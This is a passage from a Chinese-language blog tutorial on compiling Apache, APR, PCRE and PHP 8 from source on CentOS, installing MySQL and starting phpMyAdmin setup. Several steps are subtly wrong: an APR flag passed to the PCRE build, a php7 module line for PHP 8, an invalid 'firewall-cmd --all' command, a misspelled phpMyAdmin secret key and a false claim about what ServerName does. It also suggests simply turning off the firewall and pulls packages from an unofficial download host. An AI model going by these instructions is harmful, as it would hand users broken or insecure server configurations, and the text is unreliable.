-s <span class="keyword">quit</span></span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></tbody></table></figure><p>其中， <code>PIDFile</code> 、 <code>ExecStartPre</code> 、 <code>ExecStart</code> 、 <code>ExecReload</code> 、 <code>KillStop</code>  和 <code>ExecStop</code>  等选项需要根据你实际安装的 Nginx 路径进行修改。</p><ol start="3"><li>保存并重新加载</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>启动</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 启动/关闭nginx</span><br><span class="line">systemctl start nginx</span><br><span class="line">systemctl stop nginx</span><br><span class="line">// 开启和关闭开机自启</span><br><span class="line">systemctl <span class="built_in">enable</span> nginx</span><br><span class="line">systemctl <span class="built_in">disable</span> nginx</span><br></pre></td></tr></tbody></table></figure><h2 id="编译安装-apache"><a class="anchor" href="#编译安装-apache">#</a> 编译安装 Apache</h2><h3 id="安装依赖"><a class="anchor" href="#安装依赖">#</a> 安装依赖</h3><p>在开始编译安装 Apache 之前，我们需要先安装一些依赖软件包，以确保编译过程顺利进行。在终端中执行以下命令，如果在安装 nginx 的时候已经安装过的包会自动跳过。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc make apr-devel apr-util-devel pcre-devel</span><br></pre></td></tr></tbody></table></figure><h3 id="编译安装-apr-库"><a class="anchor" href="#编译安装-apr-库">#</a> 编译安装 APR 库</h3><p>APR（Apache Portable Runtime）是 Apache 在不同平台上实现跨平台性的工具库，而 Apache HTTP 服务器就依赖于 APR 库。</p><ol><li>使用 wget 命令下载 APR 库的源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-1.6.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>使用 tar 命令解压缩源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apr-1.6.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>进入解压后的目录：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> apr-1.6.5</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>执行以下命令编译并安装 APR 库：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><p>其中， <code>--prefix</code>  选项指定了安装路径。这里我们将 APR 安装到  <code>/usr/local/apr</code>  目录下。</p><h3 id="编译安装-apr-util-库"><a class="anchor" href="#编译安装-apr-util-库">#</a> 编译安装 APR-util 库</h3><p>APR-util 是 APR 库的补充，它提供了一些 Apache HTTP 服务器所需的额外功能。在编译安装 Apache 时，需要使用 APR-util 库。</p><ol><li>使用 wget 命令下载 APR-util 库的源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dlcdn.apache.org//apr/apr-util-1.6.3.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>同上，使用 tar 命令解压缩源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apr-util-1.6.3.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>进入解压后的目录：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> apr-util-1.6.3</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>执行以下命令编译并安装 APR-util 库：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr/bin/apr-1-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><p>其中， <code>--prefix</code>  选项指定了安装路径， <code>--with-apr</code>  选项指定了 APR 库的安装路径。</p><h3 id="编译安装-pcre-库"><a class="anchor" href="#编译安装-pcre-库">#</a> 编译安装 PCRE 库</h3><p>PCRE（Perl Compatible Regular Expressions）是一款正则表达式库，它为 Apache HTTP 服务器提供了正则表达式支持。</p><ol><li>使用 wget 命令下载 PCRE 库的源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/pcre/pcre/8.45/pcre-8.45.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>使用 tar 命令解压缩源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf pcre-8.45.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>进入解压后的目录：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> pcre-8.45</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>执行以下命令编译并安装 PCRE 库：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/pcre --with-apr=/usr/local/apr/bin/apr-1-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><p>其中， <code>--prefix</code>  选项指定了安装路径， <code>--with-apr</code>  选项指定了 APR 库的安装路径。</p><h3 id="安装-apache"><a class="anchor" href="#安装-apache">#</a> 安装 Apache</h3><p>现在，我们已经准备好了编译 Apache 的环境。</p><ol><li>使用 wget 命令下载 Apache 的源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/apache/httpd/httpd-2.4.57.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>使用 tar 命令解压缩源代码包：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf httpd-2.4.57.tar.gz</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>进入解压后的目录：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> httpd-2.4.57</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>执行以下命令编译并安装 Apache：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/httpd --with-pcre=/usr/local/pcre --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-util</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><p>其中， <code>--prefix</code>  选项指定了安装路径， <code>--with-pcre</code>  选项指定了 PCRE 库的安装路径， <code>--with-apr</code>  和  <code>--with-apr-util</code>  选项分别指定了 APR 库和 APR-util 库的安装路径。</p><p>注意：如果在编译过程中出现任何错误，请参考错误提示进行解决。</p><h3 id="配置开机自启动"><a class="anchor" href="#配置开机自启动">#</a> 配置开机自启动</h3><p>为了让 Apache 在服务器启动时自动启动，我们需要将其配置为开机自启动服务。</p><ol><li>将 apachectl 命令复制到 /etc/init.d/ 目录下：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/local/httpd/bin/apachectl /etc/init.d/httpd</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>将以下命令添加到 /etc/profile 文件末尾：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'\nexport PATH=/usr/local/httpd/bin:/usr/local/httpd/lib:$PATH\n'</span> &gt;&gt; /etc/profile &amp;&amp; <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>创建开机自启动服务：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"#chkconfig:2345 64 36"</span> &gt; /etc/rc.d/init.d/httpd</span><br><span class="line">chkconfig --add httpd</span><br><span class="line">chkconfig httpd on</span><br></pre></td></tr></tbody></table></figure><p>现在，Apache 就已经配置为开机自启动服务了。</p><h3 id="配置防火墙"><a class="anchor" href="#配置防火墙">#</a> 配置防火墙</h3><p>为了能够让 Apache 监听 HTTP 和 HTTPS 端口，我们需要在服务器的防火墙中添加相应的规则。在终端中执行以下命令：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 放行80，443端口</span><br><span class="line">firewall-cmd --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --add-port=443/tcp --permanent</span><br><span class="line">// 重新加载防火墙</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></tbody></table></figure><p>这将添加 HTTP 端口（80）和 HTTPS 端口（443）的防火墙规则，并且将规则永久保存。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用如下命令展示所有放行的端口。</span><br><span class="line">firewall-cmd --all</span><br></pre></td></tr></tbody></table></figure><p>如果你觉得放行端口太麻烦，你也可以直接选择关掉防火墙。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">// 直接关闭开机启动</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br></pre></td></tr></tbody></table></figure><h3 id="配置-apache"><a class="anchor" href="#配置-apache">#</a> 配置 Apache</h3><p>如果上面的步骤都执行完了，并且修复了错误。那么接下来，我们需要对 Apache 进行一些配置，以确保其能够正常工作。</p><ol><li>使用 vim 或其他编辑器打开 Apache 的配置文件：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/httpd/conf/httpd.conf</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>将以下行的注释符号（#）去掉：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#ServerName www.example.com:80</span><br></pre></td></tr></tbody></table></figure><p>这将允许 Apache 监听所有可用的网络接口，并且可以响应来自任何主机的请求。</p><ol start="3"><li>保存并关闭文件。</li></ol><h3 id="启动-apache"><a class="anchor" href="#启动-apache">#</a> 启动 Apache</h3><p>使用以下命令启动 Apache 服务：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd</span><br></pre></td></tr></tbody></table></figure><p>现在，你可以通过浏览器访问服务器的 IP 地址或域名，验证 Apache 是否已经成功安装和配置。</p><p>如果一切正常，你应该能够看到 Apache 的默认欢迎页面。</p><p>such as：</p><blockquote><div class="tag-plugin image"><div class="image-bg"><img src="Pasted" alt="image 20230519161454.png" fancybox="true"></div><div class="image-meta"><span class="image-caption center">image 20230519161454.png</span></div></div></blockquote><h2 id="编译安装php"><a class="anchor" href="#编译安装php">#</a> 编译安装 PHP</h2><h3 id="安装依赖-2"><a class="anchor" href="#安装依赖-2">#</a> 安装依赖</h3><p>安装 epel-release 源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release</span><br></pre></td></tr></tbody></table></figure><p>更新系统</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></tbody></table></figure><p>安装 PHP 所需依赖</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install php-mcrypt libmcrypt libmcrypt-devel autoconf freetype gd jpegsrc libmcrypt libpng libpng-devel libjpeg libxml2 libxml2-devel zlib curl curl-devel openssl openssl-devel sqlite-devel</span><br></pre></td></tr></tbody></table></figure><p>安装 oniguruma 库</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install http://down.24kplus.com/linux/oniguruma/oniguruma-6.7.0-1.el7.x86_64.rpm</span><br><span class="line">yum -y install http://down.24kplus.com/linux/oniguruma/oniguruma-devel-6.7.0-1.el7.x86_64.rpm</span><br></pre></td></tr></tbody></table></figure><h3 id="下载-php"><a class="anchor" href="#下载-php">#</a> 下载 PHP</h3><p>下载 PHP 源码包</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.php.net/distributions/php-8.2.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><p>解压源码包</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf php-8.2.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><p>进入源码包目录</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> php-8.2.5</span><br></pre></td></tr></tbody></table></figure><h3 id="配置-php-并编译安装"><a class="anchor" href="#配置-php-并编译安装">#</a> 配置 PHP 并编译安装</h3><p>使用以下命令配置编译选项：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/php8/ --with-config-file-path=/usr/local/php8/etc/ --with-apxs2=/usr/local/httpd/bin/apxs --enable-mbstring --with-curl -with-gd --enable-fpm --enable-mysqlnd --with-pdo-mysql=mysqlnd --with-mysqli=mysqlnd</span><br></pre></td></tr></tbody></table></figure><p>或者将上述命令分成多行，更易读：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=/usr/local/php8 \</span><br><span class="line">--with-config-file-path=/usr/local/php8/etc \</span><br><span class="line">--with-apxs2=/usr/local/httpd/bin/apxs \</span><br><span class="line">--with-mysql-sock=/usr/local/mysql/mysql.sock \</span><br><span class="line">--with-mysqli \</span><br><span class="line">--with-zlib \</span><br><span class="line">--with-curl \</span><br><span class="line">--with-gd \</span><br><span class="line">--with-jpeg-dir \</span><br><span class="line">--with-png-dir \</span><br><span class="line">--with-freetype-dir \</span><br><span class="line">--with-openssl \</span><br><span class="line">--enable-mbstring \</span><br><span class="line">--enable-xml \</span><br><span class="line">--enable-session \</span><br><span class="line">--enable-ftp \</span><br><span class="line">--enable-pdo \</span><br><span class="line">--enable-tokenizer \</span><br><span class="line">--enable-mysqlnd \</span><br><span class="line">--enable-fpm \</span><br><span class="line">--with-pdo-mysql=mysqlnd \</span><br><span class="line">--with-mysqli=mysqlnd \</span><br><span class="line">--enable-zip</span><br></pre></td></tr></tbody></table></figure><p>编译并安装 PHP</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><h3 id="配置环境变量和测试"><a class="anchor" href="#配置环境变量和测试">#</a> 配置环境变量和测试</h3><p>将 PHP 加入系统 PATH 环境变量</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'\nexport PATH=/usr/local/php8/bin:/usr/local/php8/sbin:$PATH\n'</span> &gt;&gt; /etc/profile &amp;&amp; <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></tbody></table></figure><p>测试 PHP-FPM 配置是否正确</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-fpm -t</span><br></pre></td></tr></tbody></table></figure><p>如果配置正确，会输出如下信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[18-Apr-2023 10:12:57] NOTICE: configuration file /usr/local/php8/etc/php-fpm.conf test is successful</span><br></pre></td></tr></tbody></table></figure><h3 id="启动和关闭-php-fpm"><a class="anchor" href="#启动和关闭-php-fpm">#</a> 启动和关闭 PHP-FPM</h3><p>启动 PHP-FPM</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/php-fpm</span><br></pre></td></tr></tbody></table></figure><p>关闭 PHP-FPM</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill php-fpm</span><br></pre></td></tr></tbody></table></figure><h3 id="配置-apache-2"><a class="anchor" href="#配置-apache-2">#</a> 配置 Apache</h3><p>编辑 Apache 配置文件，使其可以解析 php。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/local/httpd/conf/httpd.conf</span><br></pre></td></tr></tbody></table></figure><ol><li>加载 PHP 模块</li></ol><p>查看是否已经添加了，如果没有在 loadModule 处添加。正确安装后，应该已经有了。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php7_module modules/libphp7.so</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>设置默认文档</li></ol><p>在  <code>&lt;IfModule dir_module&gt;</code>  模块添加  <code>index.php</code> ，作为默认文档。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIndex index.html index.php</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>添加 PHP 文件类型</li></ol><p>在 Apache 配置文件中找到以下内容：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-compress .Z</span><br><span class="line">AddType application/x-gzip .gz .tgz</span><br></pre></td></tr></tbody></table></figure><p>添加如下内容：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php-source .phps</span><br><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></tbody></table></figure><h3 id="重启-apache"><a class="anchor" href="#重启-apache">#</a> 重启 Apache</h3><p>重启 Apache 使配置生效</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></tbody></table></figure><h3 id="测试"><a class="anchor" href="#测试">#</a> 测试</h3><p>在 Apache 根目录下创建一个  <code>index.php</code>  文件，内容如下：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在浏览器中访问： <code>http://your_domain/index.php</code> ，如果看到 PHP 信息页，说明 PHP 已经成功安装和配置。</p><div class="tag-plugin image"><div class="image-bg"><img src="./img/WebBackcreat1/20230421154601.png" fancybox="true"></div></div><h2 id="mysql-的安装"><a class="anchor" href="#mysql-的安装">#</a> Mysql 的安装</h2><p>Mysql 我就不用编译安装了，有点折磨。</p><ol><li><p>先安装 wget  <code>yum install wget</code> 。</p></li><li><p>下载并安装 mysql。</p></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://dev.mysql.com/get/mysql80-community-release-el7-7.noarch.rpm</span><br><span class="line"></span><br><span class="line">yum -y localinstall mysql80-community-release-el7-7.noarch.rpm</span><br><span class="line"></span><br><span class="line">yum -y install mysql-community-server</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>启动 mysql</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 启动mysql</span><br><span class="line"></span><br><span class="line">systemctl start mysqld</span><br><span class="line"></span><br><span class="line">// 写入开机启动</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> mysqld</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>查找日志并找到临时密码。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vi /var/log/mysqld.log</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><div class="tag-plugin image"><div class="image-bg"><img src="./img/WebBackcreat1/20221019082932.png" fancybox="true"></div></div> &nbsp;</blockquote><ol start="5"><li>登录 mysql</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">// 密码则为查找到的临时密码。</span><br><span class="line"></span><br><span class="line">password:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>修改密码</li></ol><blockquote><p>我有专门说过这傻逼 mysql 改密码。可以到我的博客上看看。</p></blockquote><ol start="7"><li>重启 mysql 服务</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">service mysqld restart</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>重启后就可以正常使用 mysql 了。</p></blockquote><h2 id="访问之前"><a class="anchor" href="#访问之前">#</a> 访问之前</h2><blockquote><p>上面有提到端口开放，可以用这条命令看看是否放开了：</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --all</span><br></pre></td></tr></tbody></table></figure><hr><h1 id="安装web程序"><a class="anchor" href="#安装web程序">#</a> 安装 web 程序</h1><p>安装好 LAMP/LNMP 环境后就可以安装和使用对应环境的网页程序了，这里给出一些常见的环境。</p><h2 id="安装pma"><a class="anchor" href="#安装pma">#</a> 安装 pma</h2><p>phpMyAdmin（简称 PMA）是一款基于 PHP 的 MySQL 数据库管理工具，可以通过 Web 界面对 MySQL 数据库进行管理，包括创建、修改和删除数据库、表、字段、索引等操作，同时还支持 SQL 查询和导入导出数据等功能，是 MySQL 管理的重要工具之一。</p><ol><li>下载 PMA：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://files.phpmyadmin.net/phpMyAdmin/5.2.1/phpMyAdmin-5.2.1-all-languages.zip</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>解压 PMA：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip phpMyAdmin-5.2.1-all-languages.zip</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>重命名解压后的目录：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> phpMyAdmin-5.2.1-all-languages pma</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>安装 PHP mysqli 扩展：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install php-mysqli</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>进入 PMA 目录：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> pma</span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>复制配置文件：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> config.sample.inc.php config.inc.php</span><br></pre></td></tr></tbody></table></figure><ol start="7"><li>修改配置文件：</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi config.inc.php</span><br></pre></td></tr></tbody></table></figure><p>在该文件中，您需要修改以下参数：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">'Servers'</span>][<span class="variable">$i</span>][<span class="string">'host'</span>] = <span class="string">'localhost'</span>; <span class="comment">// 数据库主机地址</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">'Servers'</span>][<span class="variable">$i</span>][<span class="string">'port'</span>] = <span class="string">'3306'</span>; <span class="comment">// 数据库端口号</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">'Servers'</span>][<span class="variable">$i</span>][<span class="string">'user'</span>] = <span class="string">'root'</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">'Servers'</span>][<span class="variable">$i</span>][<span class="string">'password'</span>] = <span class="string">'your_password'</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">'bluefish'</span>] = <span class="string">''</span>; <span class="comment">// 用于加密的密钥，可以留空</span></span><br></pre></td></tr></tbody></table></figure><p>将上述参数修改为您的 MySQL 数据库的实际配置即可。如果您的 MySQL 数据库与 PMA 安装在同一台服务器上，那么主机地址可以设置为  <code>localhost</code> ，端口号可以设置为默认的  <code>3306</code> 。如果您的 MySQL 数据库与 PMA 安装在不同的服务器上，那么主机地址应该设置为 MySQL 数据库的 IP 地址，端口号可以根据实际情况进行修改。</p><ol start="8"><li>配置 HTTP 访问：</li></ol><p>将 PMA 目录放置在 Apache 或 Nginx 的根目录下，例如  <code>/var/www/html</code> ，然后通过 HTTP 协议访问，例如  <code>http://your_domain/pma</code> 。</p><p>如果您使用的是 Apache，还需要在 Apache 配置文件中添加以下内容：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Alias</span> /pma /var/www/html/pma</span><br><span class="line"><span class="section">&lt;Directory /var/www/html/pma&gt;</span></span><br><span class="line">    <span class="attribute">Options</span> FollowSymLinks</span><br><span class="line">    <span class="attribute">DirectoryIndex</span> index.php</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span 